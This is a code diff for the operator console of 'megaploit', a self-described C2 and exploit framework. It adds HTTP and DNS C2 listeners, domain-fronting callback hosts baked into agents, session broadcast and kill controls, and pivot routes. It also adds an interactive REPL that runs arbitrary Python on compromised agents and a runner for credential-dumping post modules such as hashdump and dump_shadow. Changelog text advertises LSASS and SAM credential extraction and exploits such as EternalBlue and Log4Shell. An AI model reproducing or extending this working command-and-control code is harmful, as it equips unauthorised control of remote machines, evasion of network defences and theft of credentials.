@@ -47,6 +47,17 @@ from megaploit.server.listener import (
     Listener, build_ssl_context,
     generate_self_signed_cert, _AUTO_CERT, _AUTO_KEY,
 )
+try:
+    from megaploit.server.http_listener import HttpListener as _HttpListener
+    _HAS_HTTP_LISTENER = True
+except ImportError:  # pragma: no cover
+    _HAS_HTTP_LISTENER = False
+
+try:
+    from megaploit.server.dns_listener import DnsListener as _DnsListener
+    _HAS_DNS_LISTENER = True
+except ImportError:  # pragma: no cover
+    _HAS_DNS_LISTENER = False
 from megaploit.server.session import Session
 from megaploit.toolbox.registry import registry as _tool_registry
 from megaploit.toolbox import installer as _installer
@@ -289,16 +300,16 @@ _BANNER_LINES = [
 # 256-colour gradient: bright red → dark red per line
 _BANNER_COLOURS = [196, 160, 124, 88, 52, 238]
 
-_VERSION  = "v4.0.0"
+_VERSION  = "v4.1.0"
 _SUBTITLE = "Professional C2 & Exploit Framework"
 _TAGLINE  = "For Authorized Penetration Testing Only"
 
-# v4 feature badges shown on the subtitle row
+# v4.1 feature badges shown on the subtitle row
 _BADGES = [
     ("Meterpreter-class Shell", 39),   # sky blue
-    ("20 Exploit Modules",       82),   # bright green
-    ("AES-256-GCM",             220),   # gold
-    ("553 Tests ✓",              46),   # green
+    ("135 Commands",            82),   # bright green
+    ("AES-256-GCM",            220),   # gold
+    ("553 Tests ✓",             46),   # green
 ]
 
 # ---------------------------------------------------------------------------
@@ -306,7 +317,37 @@ _BADGES = [
 # ---------------------------------------------------------------------------
 
 _CHANGELOG: list[tuple[str, list[str]]] = [
-    ("Kiwi  [NEW v4]", [
+    ("Metasploit Gaps Closed  [NEW v4.1]", [
+        "run_as <user> <pass> <cmd>  — execute as another user (CreateProcessWithLogonW / sudo -u)",
+        "execute <exe> [args]        — explicit argv execution, no shell, captures stdout+stderr",
+        "reg query|get|set|delete    — full Windows registry CRUD (REG_SZ/DWORD/BINARY/MULTI_SZ…)",
+        "getdesktop / enumdesktops   — desktop name + window station enumeration (Windows)",
+        "net_view [domain]           — list domain computers, DCs and shares",
+        "arp_scan <cidr>             — active ARP scan (scapy → arp-scan → nmap fallback)",
+        "verify <local> <remote>     — compare SHA-256 both sides after any transfer",
+        "run_bg <cmd> / job_result   — background command execution via the jobs engine",
+        "load_ext <local.py>         — one-step: upload Python extension + register its verbs",
+        "upload / download           — now show file size, elapsed time, and transfer speed",
+    ]),
+    ("Session Management  [NEW v4.1]", [
+        "sessions -K              — kill ALL active sessions",
+        "sessions -k <id>         — kill one session by ID",
+        "sessions -u <id>         — upgrade session: load meterp extensions via load_extension",
+        "sessions -c <cmd>        — broadcast a C2 command (not just raw shell) to all sessions",
+        "sessions -s <tag>        — filter session list by tag substring",
+    ]),
+    ("Pivot Routes  [NEW v4.1]", [
+        "route add <cidr> <sid>   — add a server-side pivot route through a session",
+        "route remove <cidr>      — remove a route",
+        "route print              — list all routes",
+        "route flush              — clear all routes",
+    ]),
+    ("irb & Post Modules  [NEW v4.1]", [
+        "irb  (in session)        — interactive Python REPL on the agent, multi-line buffer",
+        "run post/multi/gather/sysinfo  — run any registered post module against live session",
+        "run post/linux/gather/dump_shadow, run post/windows/gather/hashdump, …",
+    ]),
+    ("Kiwi  [v4]", [
         "kiwi logonpasswords — LSASS ReadProcessMemory scan, NTLM hash + SHA1 extraction",
         "kiwi sam            — SAM hive offline dump via RegSaveKey + bootkey recovery",
         "kiwi lsa            — LSA secrets enumeration (SECURITY\\Policy\\Secrets)",
@@ -328,7 +369,7 @@ _CHANGELOG: list[tuple[str, list[str]]] = [
         "SHA-256 fingerprint shown in startup config box",
         "Uses cryptography package; falls back to openssl subprocess",
     ]),
-    ("Advanced Shell  [NEW v4]", [
+    ("Advanced Shell  [v4]", [
         "MeterpreterSession interactive console — tab-complete, per-session history",
         "migrate <pid>  — inject agent into another process (Windows + POSIX)",
         "port_scan <host> <ports>  — TCP scan from target's perspective (256 threads)",
@@ -338,7 +379,7 @@ _CHANGELOG: list[tuple[str, list[str]]] = [
         "pty_shell  — real PTY with resize on Unix, cmd.exe pipe on Windows",
         "whoami · getpid · getuid · sleep · beacon_sleep",
     ]),
-    ("Exploit Modules  [NEW v4]", [
+    ("Exploit Modules  [v4]", [
         "20 modules: EternalBlue, BlueKeep, ProxyLogon, Log4Shell, Spring4Shell",
         "PrintNightmare, Heartbleed, vsFTPd backdoor, Shellshock, Citrix CVE",
         "Apache Struts, IIS WebDAV, Redis RCE, Redis unauth, SQL injection",
@@ -519,7 +560,8 @@ def _human_size(n: int) -> str:
 # ---------------------------------------------------------------------------
 
 _GLOBAL_CMDS  = [
-    "sessions", "use", "generate", "set", "help", "clear", "exit",
+    "sessions", "sessions -K", "sessions -k", "sessions -u", "sessions -c", "sessions -s",
+    "use", "generate", "set", "help", "clear", "exit",
     "toolbox", "plugins", "whatsnew",
     "loot", "engagement", "broadcast", "alias", "unalias", "aliases",
     "history", "env_probe", "workspace",
@@ -528,8 +570,19 @@ _GLOBAL_CMDS  = [
     "show modules", "info", "run", "check", "options", "setopt", "back",
     # Operations
     "jobs", "creds", "report", "autorun", "stage0",
+    # New features
+    "resource",
+    "workspace new", "workspace switch", "workspace list",
+    "workspace delete", "workspace rename", "workspace stats",
+    "listener add", "listener rm", "listener list",
+    # Gap 4: pivot routes
+    "route", "route add", "route remove", "route print", "route flush",
 ]
-_SESSION_CMDS = list(all_commands().keys()) + ["back", "clear"]
+_SESSION_CMDS = list(all_commands().keys()) + [
+    "back", "clear",
+    "irb",            # Gap 8: Python REPL on agent
+    "run",            # Gap 9/15: post module runner
+]
 
 def _completer(text: str, state: int) -> Optional[str]:
     tool_names   = [f"toolbox_run {t.name}" for t in _tool_registry.all()]
@@ -556,7 +609,17 @@ class Console:
         self._sessions_lock = threading.Lock()
         self._new_sessions: queue.Queue[Session] = queue.Queue()
         self._listener: Optional[Listener] = None
+        # Extra listeners created via "listener add" — keyed by port
+        self._extra_listeners: dict[int, Listener] = {}
         self._updater: Optional[_UpdateChecker] = None
+
+        # Session pruner (feature 6b) — auto-close sessions idle > 5 min
+        from megaploit.core.heartbeat import SessionPruner
+        self._pruner = SessionPruner(
+            get_sessions=lambda: dict(self._sessions),
+            on_prune=self._prune_session,
+            max_idle=300.0,
+        )
 
         # ── Persistent settings ──────────────────────────────────────
         self._settings: dict = load_settings()
@@ -724,6 +787,7 @@ class Console:
             allowed_ips=self.allowed_ips or None,
         )
         self._listener.start()
+        self._pruner.start()
         print(ok(f"Listener ready on {_c(self.bind_host, _CYAN)}:{_c(str(self.port), _CYAN)}"))
         print(info(f"Agents should call back to  {_c(self.lhost, _WHITE)}:{_c(str(self.port), _WHITE)}"))
         print()
@@ -797,10 +861,188 @@ class Console:
             print(err(f"Unknown tls sub-command: {sub}"))
             print(info("Usage:  tls auto  |  tls regen  |  tls status"))
 
+    # ---------------------------------------------------------------
+    # Multi-listener management
+    # ---------------------------------------------------------------
+
+    def _cmd_listener(self, args: list[str]) -> None:
+        """
+        listener add <port> [--tls]   — start an additional listener
+        listener rm  <port>            — stop an additional listener
+        listener list                  — show all active listeners
+        """
+        sub = args[0].lower() if args else "list"
+
+        if sub == "list":
+            lines = []
+            # Primary listener
+            if self._listener:
+                tls = _c("TLS", _GREEN) if self._listener.ssl_context else _c("plain", _GREY)
+                lines.append(
+                    f"  {_c('●', _GREEN)} {_c('primary', _BOLD):<12}  "
+                    f"port={_c(str(self._listener.port), _CYAN)}  {tls}"
+                )
+            for port, lst in sorted(self._extra_listeners.items()):
+                tls = _c("TLS", _GREEN) if lst.ssl_context else _c("plain", _GREY)
+                lines.append(
+                    f"  {_c('●', _CYAN)} {_c('extra', _DIM):<12}  "
+                    f"port={_c(str(port), _CYAN)}  {tls}"
+                )
+            if not lines:
+                print(info("No active listeners."))
+            else:
+                print()
+                for l in lines:
+                    print(l)
+                print()
+            return
+
+        if sub == "add":
+            if not args[1:] or not args[1].isdigit():
+                print(err("Usage: listener add <port> [--tls] [--http] [--dns --zone <zone>]"))
+                return
+            port = int(args[1])
+            if port == self.port or port in self._extra_listeners:
+                print(err(f"Port {port} is already in use by an active listener."))
+                return
+
+            use_http = "--http" in args
+            use_dns  = "--dns"  in args
+
+            # --- HTTP/HTTPS listener ---
+            if use_http:
+                if not _HAS_HTTP_LISTENER:
+                    print(err("HttpListener is not available (import failed)."))
+                    return
+                use_tls = "--tls" in args
+                ssl_ctx: Optional[ssl.SSLContext] = None
+                if use_tls:
+                    if self.cert and self.key_file:
+                        try:
+                            ssl_ctx = build_ssl_context(self.cert, self.key_file)
+                        except ssl.SSLError as e:
+                            print(err(f"TLS error: {e}"))
+                            return
+                    else:
+                        cert_p, key_p, _ = self._do_tls_auto(self.lhost or "megaploit")
+                        if cert_p:
+                            try:
+                                ssl_ctx = build_ssl_context(cert_p, key_p)
+                            except ssl.SSLError as e:
+                                print(err(f"TLS error: {e}"))
+                                return
+                try:
+                    lst = _HttpListener(
+                        bind_host=self.bind_host,
+                        port=port,
+                        secret_key=self.secret_key,
+                        on_session=self._on_new_session,
+                        ssl_context=ssl_ctx,
+                        allowed_ips=self.allowed_ips or None,
+                    )
+                    lst.start()
+                    self._extra_listeners[port] = lst
+                    tls_note = _c("  TLS enabled", _GREEN) if ssl_ctx else ""
+                    print(ok(f"HTTP listener added on port {_c(str(port), _CYAN)}.{tls_note}"))
+                except OSError as e:
+                    print(err(f"Could not bind HTTP listener on port {port}: {e}"))
+                return
+
+            # --- DNS C2 listener ---
+            if use_dns:
+                if not _HAS_DNS_LISTENER:
+                    print(err("DnsListener is not available (import failed)."))
+                    return
+                # Extract --zone <zone>
+                zone = ""
+                if "--zone" in args:
+                    zi = args.index("--zone")
+                    zone = args[zi + 1] if zi + 1 < len(args) else ""
+                if not zone:
+                    print(err("DNS listener requires --zone <domain.zone>"))
+                    return
+                try:
+                    lst = _DnsListener(
+                        bind_host=self.bind_host,
+                        port=port,
+                        zone=zone,
+                        secret_key=self.secret_key,
+                        on_session=self._on_new_session,
+                    )
+                    lst.start()
+                    self._extra_listeners[port] = lst
+                    print(ok(f"DNS listener added on port {_c(str(port), _CYAN)}  zone={_c(zone, _CYAN)}"))
+                except OSError as e:
+                    print(err(f"Could not bind DNS listener on port {port}: {e}"))
+                return
+
+            # --- Standard TCP listener ---
+            use_tls = "--tls" in args
+            ssl_ctx = None
+            if use_tls:
+                if self.cert and self.key_file:
+                    try:
+                        ssl_ctx = build_ssl_context(self.cert, self.key_file)
+                    except ssl.SSLError as e:
+                        print(err(f"TLS error: {e}"))
+                        return
+                else:
+                    cert_p, key_p, _ = self._do_tls_auto(self.lhost or "megaploit")
+                    if cert_p:
+                        try:
+                            ssl_ctx = build_ssl_context(cert_p, key_p)
+                        except ssl.SSLError as e:
+                            print(err(f"TLS error: {e}"))
+                            return
+            try:
+                lst = Listener(
+                    bind_host=self.bind_host,
+                    port=port,
+                    secret_key=self.secret_key,
+                    on_session=self._on_new_session,
+                    ssl_context=ssl_ctx,
+                    allowed_ips=self.allowed_ips or None,
+                )
+                lst.start()
+                self._extra_listeners[port] = lst
+                tls_note = _c("  TLS enabled", _GREEN) if ssl_ctx else ""
+                print(ok(f"Listener added on port {_c(str(port), _CYAN)}.{tls_note}"))
+            except OSError as e:
+                print(err(f"Could not bind port {port}: {e}"))
+            return
+
+        if sub == "rm":
+            if not args[1:] or not args[1].isdigit():
+                print(err("Usage: listener rm <port>"))
+                return
+            port = int(args[1])
+            lst = self._extra_listeners.pop(port, None)
+            if lst is None:
+                print(err(f"No extra listener on port {port}."))
+            else:
+                lst.stop()
+                print(ok(f"Listener on port {_c(str(port), _CYAN)} stopped."))
+            return
+
+        print(err(f"Unknown listener sub-command: {sub}"))
+        print(info("Usage: listener add <port> [--tls] [--http] [--dns --zone <zone>]  |  listener rm <port>  |  listener list"))
+
+    def _prune_session(self, session_id: int, session: Session) -> None:
+        """Called by SessionPruner when a session has been idle too long."""
+        with self._sessions_lock:
+            self._sessions.pop(session_id, None)
+        try:
+            session.close()
+        except Exception:
+            pass
+        print(warn(f"  Session #{session_id} pruned — idle > {self._pruner._max_idle:.0f}s"))
+
     def _on_new_session(self, session: Session) -> None:
         with self._sessions_lock:
             self._sessions[session.id] = session
         self._new_sessions.put(session)
+        # Record initial activity for the pruner
+        self._pruner.record_activity(session.id)
         # Pipeline — autorun baseline + active collection profiles
         try:
             cmds = _pipeline.commands_for(session)
@@ -811,7 +1053,8 @@ class Console:
                     for cmd in c:
                         try:
                             from megaploit.server.commands import dispatch as _dispatch
-                            _dispatch(s, cmd)
+                            result = _dispatch(s, cmd)
+                            self._pruner.record_activity(s.id)
                         except Exception:
                             pass
                 threading.Thread(target=_dispatch_autorun, daemon=True).start()
@@ -897,8 +1140,7 @@ class Console:
             elif cmd == "clear":
                 os.system("cls" if os.name == "nt" else "clear")
             elif cmd == "sessions":
-                with self._sessions_lock:
-                    _print_sessions(dict(self._sessions))
+                self._cmd_sessions_global(args)
             elif cmd == "use":
                 self._cmd_use(args)
             elif cmd == "generate":
@@ -959,6 +1201,8 @@ class Console:
                 self._cmd_engagement(args)
             elif cmd == "broadcast":
                 self._cmd_broadcast(args)
+            elif cmd == "route":
+                self._cmd_route(args)
             elif cmd in ("alias",):
                 self._cmd_alias(args)
             elif cmd == "unalias":
@@ -971,6 +1215,10 @@ class Console:
                 self._cmd_env_probe(args)
             elif cmd == "workspace":
                 self._cmd_workspace(args)
+            elif cmd == "listener":
+                self._cmd_listener(args)
+            elif cmd == "resource":
+                self._cmd_resource(args)
             elif _plugin_loader.is_plugin_command(cmd):
                 pc     = _plugin_loader.get_command(cmd)
                 result = _run_plugin_cmd(pc, args, lhost=self.lhost, port=self.port)
@@ -1046,6 +1294,16 @@ class Console:
                       f"{_c('toolbox info <name>', _CYAN)}")
                 continue
 
+            # Gap 8: irb — interactive Python REPL on the agent
+            if cmd_name == "irb":
+                self._session_irb(session)
+                continue
+
+            # Gap 9 / Gap 15: run <post/module> inside session context
+            if cmd_name == "run" and args:
+                self._session_run_post(session, args)
+                continue
+
             # Dangerous command confirmation
             cmds = all_commands()
             is_dangerous = (
@@ -1081,6 +1339,7 @@ class Console:
                 continue
 
             result: CommandResult = dispatch(session, raw)
+            self._pruner.record_activity(session.id)
             self._print_result(result)
 
             if result.close_session:
@@ -1134,13 +1393,23 @@ class Console:
             print(err("Set LHOST and PORT first:  set lhost <ip>  /  set port <port>"))
             return
         use_tls = "--tls" in args or "-t" in args
+
+        # --redirector <host>  — bake a different callback host into the agent
+        # (CDN edge, cloud front domain, etc.) while the actual listener stays on LHOST.
+        redirector_host = self.lhost
+        for i, a in enumerate(args):
+            if a == "--redirector" and i + 1 < len(args):
+                redirector_host = args[i + 1]
+                print(info(f"Domain-fronting: agent will call back to  {_c(redirector_host, _CYAN)}"))
+                break
+
         if use_tls and not self.cert:
             # Auto-generate cert so the agent has a TLS server to connect to
             self._tls_auto = True
             cert_path, key_path, fp = self._do_tls_auto(self.lhost)
             if cert_path:
                 print(ok(f"TLS cert ready  →  {_c(cert_path, _CYAN)}"))
-        _patch_agent(self.lhost, self.port, use_tls=use_tls)
+        _patch_agent(redirector_host, self.port, use_tls=use_tls)
         if "--compile" in args or "-c" in args:
             try:
                 py_compile.compile("agent.py", doraise=True)
@@ -1205,8 +1474,16 @@ class Console:
             _section("Global Commands"),
             "",
             _cmd_row("sessions",                      "List active sessions (tag + OS columns)"),
+            _cmd_row("sessions -K",                   "Kill ALL sessions"),
+            _cmd_row("sessions -k <id>",              "Kill one session by ID"),
+            _cmd_row("sessions -u <id>",              "Upgrade session to meterp"),
+            _cmd_row("sessions -c <cmd>",             "Run a C2 command across all sessions"),
+            _cmd_row("sessions -s <tag>",             "Filter sessions by tag"),
             _cmd_row("use <id>",                      "Interact with a session"),
             _cmd_row("broadcast <cmd>",               "Run a shell cmd on ALL active sessions"),
+            _cmd_row("route add <cidr> <sid>",        "Add pivot route through a session"),
+            _cmd_row("route remove <cidr>",           "Remove a pivot route"),
+            _cmd_row("route print",                   "List all pivot routes"),
             _cmd_row("generate [-c] [--tls]",         "Patch agent.py  (-c compile, --tls auto-cert + TLS)"),
             _cmd_row("tls auto",                      "Generate self-signed cert and enable TLS now"),
             _cmd_row("tls regen",                     "Force-regenerate the auto self-signed cert"),
@@ -2275,6 +2552,247 @@ class Console:
         print()
 
     # ---------------------------------------------------------------
+    # Gap 4 — pivot route table  (sessions -c broadcasts already work via
+    # broadcast; route add/remove/print live here)
+    # ---------------------------------------------------------------
+
+    def _cmd_route(self, args: list[str]) -> None:
+        """
+        Manage server-side pivot routes.
+
+        route add    <cidr> <session_id>  — add a route through a session
+        route remove <cidr>               — remove a route
+        route print                       — list all routes
+        route flush                       — remove all routes
+
+        Routes are informational (they document pivot topology) and are
+        consulted by toolbox tools / post modules that use them to decide
+        which session to proxy traffic through.
+        """
+        if not hasattr(self, "_routes"):
+            self._routes: dict[str, int] = {}   # cidr → session_id
+
+        sub = args[0].lower() if args else "print"
+
+        if sub == "print":
+            if not self._routes:
+                print(info("  No routes defined."))
+                return
+            print()
+            print(_c(f"  {'CIDR':<22} SESSION ID", _BOLD, _WHITE))
+            print(_rule("─", width=40))
+            for cidr, sid in sorted(self._routes.items()):
+                print(f"  {_c(cidr, _CYAN):<31} #{sid}")
+            print()
+
+        elif sub == "add":
+            if len(args) < 3 or not args[2].isdigit():
+                print(err("Usage: route add <cidr> <session_id>"))
+                return
+            cidr = args[1]
+            sid  = int(args[2])
+            with self._sessions_lock:
+                if sid not in self._sessions:
+                    print(err(f"No active session #{sid}"))
+                    return
+            try:
+                import ipaddress
+                ipaddress.ip_network(cidr, strict=False)
+            except ValueError:
+                print(err(f"Invalid CIDR: {cidr}"))
+                return
+            self._routes[cidr] = sid
+            print(ok(f"Route added: {cidr} → session #{sid}"))
+
+        elif sub == "remove":
+            if len(args) < 2:
+                print(err("Usage: route remove <cidr>"))
+                return
+            cidr = args[1]
+            if cidr in self._routes:
+                del self._routes[cidr]
+                print(ok(f"Route removed: {cidr}"))
+            else:
+                print(err(f"No route for {cidr}"))
+
+        elif sub == "flush":
+            count = len(self._routes)
+            self._routes.clear()
+            print(ok(f"Flushed {count} route(s)."))
+
+        else:
+            print(err(f"Unknown route sub-command: {sub}.  Use: add / remove / print / flush"))
+
+    # ---------------------------------------------------------------
+    # Gap 12 — sessions -K (kill all), -u (upgrade), -c (broadcast cmd)
+    # ---------------------------------------------------------------
+
+    def _cmd_sessions_global(self, args: list[str]) -> None:
+        """
+        sessions            — list sessions (same as before)
+        sessions -K         — kill all sessions
+        sessions -k <id>    — kill session by ID
+        sessions -u <id>    — upgrade session to meterp (sends load_extension)
+        sessions -c <cmd>   — run a C2 command across all sessions
+        sessions -s <tag>   — filter and list sessions by tag
+        """
+        if not args:
+            with self._sessions_lock:
+                _print_sessions(dict(self._sessions))
+            return
+
+        flag = args[0]  # preserve case for -K vs -k
+
+        if flag == "-k" and len(args) >= 2 and args[1].isdigit():
+            sid = int(args[1])
+            with self._sessions_lock:
+                sess = self._sessions.pop(sid, None)
+            if sess:
+                sess.close()
+                print(ok(f"Session #{sid} killed."))
+            else:
+                print(err(f"No session #{sid}"))
+
+        elif flag == "-k":
+            print(err("Usage: sessions -k <id>"))
+
+        elif flag == "-K":
+            with self._sessions_lock:
+                targets = list(self._sessions.values())
+                self._sessions.clear()
+            for sess in targets:
+                sess.close()
+            print(ok(f"Killed {len(targets)} session(s)."))
+
+        elif args[0] == "-u" and len(args) >= 2 and args[1].isdigit():
+            sid = int(args[1])
+            with self._sessions_lock:
+                sess = self._sessions.get(sid)
+            if not sess:
+                print(err(f"No session #{sid}"))
+                return
+            # Upgrade: load the meterp extension into the session
+            from megaploit.server.commands import dispatch
+            result = dispatch(sess, "list_extensions")
+            if "meterp" in result.output.lower():
+                print(info(f"Session #{sid} already has meterp extensions loaded."))
+            else:
+                result2 = dispatch(sess, "load_extension megaploit.agent.meterp")
+                self._print_result(result2)
+
+        elif args[0] == "-c" and len(args) >= 2:
+            cmd_str = " ".join(args[1:])
+            with self._sessions_lock:
+                targets = list(self._sessions.values())
+            if not targets:
+                print(warn("No active sessions."))
+                return
+            print(info(f"Broadcasting C2 command to {len(targets)} session(s): {_c(cmd_str, _CYAN)}"))
+            for sess in targets:
+                result = dispatch(sess, cmd_str)
+                prefix = _c(f"[#{sess.id} {sess.ip}]", _CYAN, _BOLD)
+                if result.ok:
+                    out = result.output[:400] + ("…" if len(result.output) > 400 else "")
+                    print(f"{prefix} {out}")
+                else:
+                    print(f"{prefix} {_c('error', _RED)}: {result.output[:200]}")
+            print()
+
+        elif args[0] == "-s" and len(args) >= 2:
+            tag_filter = " ".join(args[1:]).lower()
+            with self._sessions_lock:
+                filtered = {sid: s for sid, s in self._sessions.items()
+                            if tag_filter in (s.tag or "").lower()}
+            _print_sessions(filtered)
+
+        else:
+            # Fall back to plain listing if unrecognised flag
+            with self._sessions_lock:
+                _print_sessions(dict(self._sessions))
+            print(info("Flags: -K (kill all)  -k <id>  -u <id> (upgrade)  -c <cmd>  -s <tag>"))
+
+    # ---------------------------------------------------------------
+    # Gap 8 — irb: interactive Python REPL on the agent
+    # ---------------------------------------------------------------
+
+    def _session_irb(self, session: "Session") -> None:
+        """
+        Drop into an interactive Python REPL running inside the agent's
+        interpreter.  Lines are sent via run_python; multi-line input is
+        accumulated until a blank line is submitted.  Type  exit  or  quit
+        to leave.
+        """
+        from megaploit.server.commands import dispatch
+        print()
+        print(_c("  ╔══════════════════════════════════════════════╗", _CYAN))
+        print(_c("  ║  Agent Python REPL  (irb)                   ║", _CYAN))
+        print(_c("  ║  Submit blank line to execute a block.       ║", _CYAN))
+        print(_c("  ║  Type  exit  or  quit  to leave.             ║", _CYAN))
+        print(_c("  ╚══════════════════════════════════════════════╝", _CYAN))
+        print()
+        buf: list[str] = []
+        while True:
+            try:
+                cont_marker = "..." if buf else ">>>"
+                line = input(f"  {_c(cont_marker, _CYAN)} ")
+            except (EOFError, KeyboardInterrupt):
+                print()
+                break
+            if line.strip() in ("exit", "quit"):
+                break
+            if line.strip() == "" and buf:
+                # Execute the accumulated block
+                code = "\n".join(buf)
+                result = dispatch(session, "run_python " + code)
+                self._print_result(result)
+                buf = []
+            elif line.strip() == "":
+                continue
+            else:
+                buf.append(line)
+        print(info("  irb session ended."))
+
+    # ---------------------------------------------------------------
+    # Gap 9 / Gap 15 — run <post/module> inside session context
+    # ---------------------------------------------------------------
+
+    def _session_run_post(self, session: "Session", args: list[str]) -> None:
+        """
+        Run a post module against the active session.
+
+        Usage (inside a session):
+            run post/multi/gather/sysinfo
+            run post/windows/gather/hashdump
+        """
+        module_path = args[0] if args else ""
+
+        # Look up in registry
+        mod = _module_registry.get(module_path)
+        if mod is None:
+            # Try with leading "post/" stripped, or search by name
+            for k, v in _module_registry._modules.items():
+                if k.endswith(module_path) or module_path in k:
+                    mod = v
+                    module_path = k
+                    break
+
+        if mod is None:
+            print(err(f"Module not found: {module_path}"))
+            print(info("  Tip: use  show modules  to browse available post modules."))
+            return
+
+        print(info(f"Running {_c(module_path, _CYAN)} against session #{session.id} ({session.ip})…"))
+        try:
+            from megaploit.modules.base import ModuleError as _ME
+            result = mod.run(session=session)
+            if result:
+                print(str(result))
+        except _ME as e:
+            print(err(str(e)))
+        except Exception as e:
+            print(err(f"Module error: {e}"))
+
+    # ---------------------------------------------------------------
     # NEW: Command aliases
     # ---------------------------------------------------------------
 
@@ -2393,8 +2911,187 @@ class Console:
     # ---------------------------------------------------------------
 
     def _cmd_workspace(self, args: list[str]) -> None:
-        """Alias: workspace <sub>  →  toolbox workspace <sub>"""
-        self._toolbox_workspace(args)
+        """
+        Engagement-isolated workspace management.
+
+        workspace list                     — list all workspaces
+        workspace new  <name> [desc]       — create a new workspace
+        workspace switch <name>            — switch active workspace
+        workspace delete <name>            — delete a workspace and all its data
+        workspace rename <old> <new>       — rename a workspace
+        workspace stats                    — row counts for current workspace
+        """
+        try:
+            from megaploit.db.workspace import workspace_db as _wdb
+        except ImportError:
+            # Fall back to the old toolbox alias if workspace_db is unavailable
+            self._toolbox_workspace(args)
+            return
+
+        sub  = args[0].lower() if args else "list"
+        rest = args[1:]
+
+        if sub in ("list", "ls"):
+            rows = _wdb.list_workspaces()
+            if not rows:
+                print(info("  No workspaces found."))
+                return
+            print()
+            print(_c(f"  {'ID':<5}  {'Name':<20}  {'Active':<8}  Description", _BOLD, _WHITE))
+            print(_rule("─", width=70))
+            for r in rows:
+                active = _c("●", _GREEN) if r.get("active") else " "
+                print(
+                    f"  {_c(str(r['id']), _CYAN):<{5+9}}  "
+                    f"{r['name']:<20}  "
+                    f"{active:<{8+9}}  "
+                    f"{_c(r.get('description',''), _DIM)}"
+                )
+            print()
+
+        elif sub == "new":
+            if not rest:
+                print(err("Usage: workspace new <name> [description]"))
+                return
+            name = rest[0]
+            desc = " ".join(rest[1:])
+            try:
+                wid = _wdb.create_workspace(name, desc)
+                print(ok(f"  Workspace {_c(name, _CYAN)} created (id={wid})."))
+            except Exception as exc:
+                print(err(f"  {exc}"))
+
+        elif sub == "switch":
+            if not rest:
+                print(err("Usage: workspace switch <name>"))
+                return
+            name = rest[0]
+            try:
+                wid = _wdb.switch_workspace(name)
+                print(ok(f"  Switched to workspace {_c(name, _CYAN)} (id={wid})."))
+            except KeyError as exc:
+                print(err(f"  {exc}"))
+
+        elif sub == "delete":
+            if not rest:
+                print(err("Usage: workspace delete <name>"))
+                return
+            name = rest[0]
+            confirm = input(_c(f"  Delete workspace '{name}' and ALL its data? [YES/no]: ", _YELLOW)).strip()
+            if confirm != "YES":
+                print(warn("  Cancelled."))
+                return
+            try:
+                _wdb.delete_workspace(name)
+                print(ok(f"  Workspace {_c(name, _CYAN)} deleted."))
+            except (KeyError, ValueError) as exc:
+                print(err(f"  {exc}"))
+
+        elif sub == "rename":
+            if len(rest) < 2:
+                print(err("Usage: workspace rename <old> <new>"))
+                return
+            try:
+                _wdb.rename_workspace(rest[0], rest[1])
+                print(ok(f"  Workspace renamed: {_c(rest[0], _CYAN)} → {_c(rest[1], _CYAN)}"))
+            except Exception as exc:
+                print(err(f"  {exc}"))
+
+        elif sub == "stats":
+            try:
+                stats = _wdb.workspace_stats()
+                print()
+                print(_c(f"  Workspace #{_wdb.workspace_id} stats", _BOLD, _WHITE))
+                print(_rule("─", width=40))
+                for table, count in sorted(stats.items()):
+                    print(f"  {_c(table, _CYAN):<{20+9}}  {count}")
+                print()
+            except Exception as exc:
+                print(err(f"  {exc}"))
+
+        else:
+            # Unknown sub → fall back to toolbox workspace for backward compat
+            self._toolbox_workspace(args)
+
+    # ---------------------------------------------------------------
+    # Resource script command
+    # ---------------------------------------------------------------
+
+    def _cmd_resource(self, args: list[str]) -> None:
+        """
+        Execute a resource script (.rc file).
+
+        resource <path>          — run the script, echoing each command
+        resource load <path>     — alias for the above
+
+        Variable substitution: ${LHOST}  ${PORT}  ${DATE}  ${TIMESTAMP}
+        """
+        from megaploit.core.resource_runner import run_resource_interactive, ResourceError
+
+        # Accept either "resource <path>" or "resource load <path>"
+        path_args = args[:]
+        if path_args and path_args[0].lower() == "load":
+            path_args = path_args[1:]
+        if not path_args:
+            print(err("Usage: resource <path>  |  resource load <path>"))
+            return
+        path = " ".join(path_args)  # allow spaces in path
+
+        # Build extra vars from Console state so ${LHOST} and ${PORT} work
+        extra: dict[str, str] = {}
+        if self.lhost:
+            extra["LHOST"] = self.lhost
+        if self.port:
+            extra["PORT"] = str(self.port)
+
+        try:
+            run_resource_interactive(
+                path=path,
+                dispatch_fn=self._dispatch_line,
+                print_fn=print,
+                extra_vars=extra,
+            )
+        except FileNotFoundError as exc:
+            print(err(f"  {exc}"))
+        except ResourceError as exc:
+            print(err(f"  Resource error: {exc}"))
+
+    def _dispatch_line(self, raw: str) -> None:
+        """Internal: dispatch a single raw CLI line (used by resource runner)."""
+        parts = raw.split()
+        if not parts:
+            return
+        # Alias expansion
+        first = parts[0].lower()
+        if first in self._aliases:
+            raw   = self._aliases[first] + (" " + " ".join(parts[1:]) if parts[1:] else "")
+            parts = raw.split()
+        cmd  = parts[0].lower()
+        args = parts[1:]
+
+        # Dispatch via the same elif chain as the main loop — delegate to each handler
+        # to avoid duplication we call the relevant methods directly
+        import importlib as _il
+        handler_map = {
+            "use":        lambda: self._cmd_use(args),
+            "set":        lambda: self._cmd_set(args),
+            "setopt":     lambda: self._cmd_setoption(args),
+            "setoption":  lambda: self._cmd_setoption(args),
+            "run":        lambda: self._cmd_module_run(args),
+            "check":      lambda: self._cmd_module_check(args),
+            "back":       lambda: setattr(self, "_active_module", None) or setattr(self, "_active_module_name", ""),
+            "generate":   lambda: self._cmd_generate(args),
+            "sessions":   lambda: print(),
+            "show":       lambda: self._cmd_show(args),
+            "info":       lambda: self._cmd_module_info(args),
+            "options":    lambda: self._cmd_module_options(),
+        }
+        handler = handler_map.get(cmd)
+        if handler:
+            handler()
+        else:
+            # Best-effort: ignore unknown commands silently rather than crashing
+            pass
 
     # ---------------------------------------------------------------
     # Module system commands
@@ -2580,14 +3277,37 @@ class Console:
             print()
 
     def _cmd_show(self, args: list[str]) -> None:
-        """show modules [query|type]"""
+        """
+        show modules [<query>]
+
+        Supports structured filter tokens (Metasploit-compatible):
+            type:<exploit|auxiliary|post|payload>
+            platform:<windows|linux|…>
+            cve:<partial-string>
+            rank:>N | rank:<N | rank:N
+            author:<substring>
+            name:<substring>
+
+        Plain words are matched as substrings against name + description.
+
+        Examples:
+            show modules
+            show modules type:exploit
+            show modules type:auxiliary platform:windows
+            show modules cve:2021 rank:>300
+            show modules kerberos
+        """
         if not args or args[0].lower() == "modules":
             query   = " ".join(args[1:]) if len(args) > 1 else ""
